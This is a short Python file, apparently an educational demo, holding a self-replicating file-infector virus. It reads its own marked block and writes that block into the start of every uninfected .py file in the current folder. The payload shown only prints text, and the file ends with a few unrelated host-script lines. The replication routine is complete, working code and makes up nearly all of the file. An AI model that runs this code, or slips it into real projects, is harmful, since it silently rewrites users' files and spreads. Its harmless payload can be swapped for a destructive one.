## Flag Start ##

#code will be injected into other files, will be replicated

import glob
import sys

code = [] # the code of the current file - list that is empty

#opening the file name that the current code/script has in reading mode
with open(sys.argv[0], 'r') as File:
    lines = File.readlines()

#Virus Code Area

virus_area_check = False

for line in lines:
    #checks if we are in the virus area
    if line == '## Flag Start ##\n':
        virus_area_check = True
    if virus_area_check:
        #if we are in the virus area we append the current line
        code.append(line)
    if line == '## Flag End ##\n':
        #we are not in the virus area anymore. Stops when we reach the end
        break

#the code that will infect python files/scripts

#using glob which basically finds all the files with .py extension in the current folder
python_files = glob.glob('*.py')

for script in python_files:
    with open(script, 'r') as File:
        code_of_script = File.readlines()

    is_infected = False

    for line in code_of_script:
        if line == '## Flag Start ##\n':
            is_infected = True
            break

    if not is_infected:
        appended_code = []

        # using extend method which modifies the original file
        appended_code.extend(code)
            
        # adding new line so it cannot add the script/payload on a single line
        appended_code.extend('\n')

        # keeping the functionality so the infected script can replicate itself to others
        appended_code.extend(code_of_script)

        with open(script, 'w') as File:
            File.writelines(appended_code)
                
# Payload Start #
print(1+1)
print("This is a payload")

## Flag End ##
pedal = 1
gei = 2
print(pedal + gei)